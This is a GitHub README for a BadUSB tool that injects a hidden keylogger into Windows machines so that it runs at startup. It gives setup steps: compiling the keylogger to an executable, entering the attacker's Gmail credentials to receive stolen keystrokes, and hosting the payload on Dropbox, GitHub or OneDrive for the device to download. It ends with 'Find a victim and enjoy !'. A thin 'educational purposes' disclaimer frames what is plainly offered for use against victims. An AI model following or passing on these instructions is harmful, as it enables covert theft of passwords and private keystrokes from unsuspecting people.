# BadUSB_passStealer
# Warning ⚠️
Everything in this repository is **strictly** for educational purposes. Notice **I am not responsible** for stolen data. **You are responsible** for your actions using developed script for **BadUSB**.
# About ℹ️
This **script** allows you to inject an invsible **keylogger** which run on **Windows** startup. To do this i used this [keylogger script](https://github.com/x4nth055/pythoncode-tutorials/tree/master/ethical-hacking/keylogger).
### NB n°1
Sometimes, you will see something like this : 
``` 
Keyboard.press(KEY_LEFT_CTRL);
Keyboard.press(KEY_LEFT_ALT);
Keyboard.press(173);
Keyboard.releaseAll(); 
```
This is only to write these characters : "@", "\\". But it depends on the computer's layout, so adapt these characters thanks to this [site](https://www.csee.umbc.edu/portal/help/theory/ascii.txt) and the sequence you actually use to wirte these characters with your keyboard. (or switch the keyboard layout to French).
### US Layout
For US layout you only have to replace by this for "\\" :
```
Keyboard.press(92);
Keyboard.releaseAll();
```
And by this for "@" :
```
Keyboard.press(64);
Keyboard.releaseAll();
```
### NB n°2
You can customize the **delay** according to the speed in which you plug the **BadUSB**.
# Getting Started ✔️
## Requirments
1. Have a **BadUSB**.

2. Install **Arduino software** [here](https://www.arduino.cc/en/software);

3. Have a **Gmail** account and enable **less secure app** [here](https://www.google.com/settings/security/lesssecureapps);

4. Have latest python version installed on your PC;

5. Have latest pip version installed on your PC;
## Install
1. Download this repository;

**Linux :**
```
git clone https://github.com/tuconnaisyouknow/BadUSB_keyloggerInjector
cd BadUSB_keyloggerInjector
```
**Windows :** Click on green button on right top of main page. Then click on "Download Zip" and extract zip file.

2. Replace your mail and password [here](https://github.com/tuconnaisyouknow/BadUSB_keyloggerInjector/blob/main/keylogger.py) at line 8, 9;

3. Convert keylogger.py in exe file with this command :
```
pip install pyinstaller
pyinstaller --onefile -w keylogger.py
```
4. Replace link [here](https://github.com/tuconnaisyouknow/BadUSB_keyloggerInjector/blob/main/keylogger.ino) with keylogger.exe link at line 93;

5. Add your code in the **BadUSB** by **Arduino software**;

6. Find a victim and enjoy !
## Requirments for victim PC
* Turn off caps lock.
* Switch the keyboard layout to French (or adapt the code according to your layout).
# How to set a link for wget the script ⬇️
## Dropbox
1. Create a dropbox account [here](https://www.dropbox.com);

2. Upload ciaoV2.ps1;

3. Copy the link of the file and change ?dl=0 by ?raw=1;

4. The link will be like this : https://dropbox.com/s/link/ciaoV2.ps1?raw=1;

5. Now put this link in the [BadUSB_passStealer.ino](https://github.com/tuconnaisyouknow/BadUSB_keyloggerInjector/blob/main/BadUSB_keylogger.ino) file;
## Github
1. Create a Github account [here](https://github.com/signup);

2. Create a public repository;

3. Upload ciaoV2.ps1;

4. Go to the ciaoV2.ps1 page and click on RAW button;

5. Copy the link of the RAW page and put it in the [BadUSB_passStealer.ino](https://github.com/tuconnaisyouknow/BadUSB_keyloggerInjector/blob/main/BadUSB_keylogger.ino) file;
## One Drive
1. Create a One Drive account [here](https://signup.live.com/signup);

2. Upload keylogger.exe file;

3. Click on keylogger.exe;

4. Click on download button;

5. Go on your browser download list (nameofyourbrowser://downloads);

6. Copy the download link and put the link in [BadUSB_passStealer.ino](https://github.com/tuconnaisyouknow/BadUSB_keyloggerInjector/blob/main/BadUSB_keylogger.ino)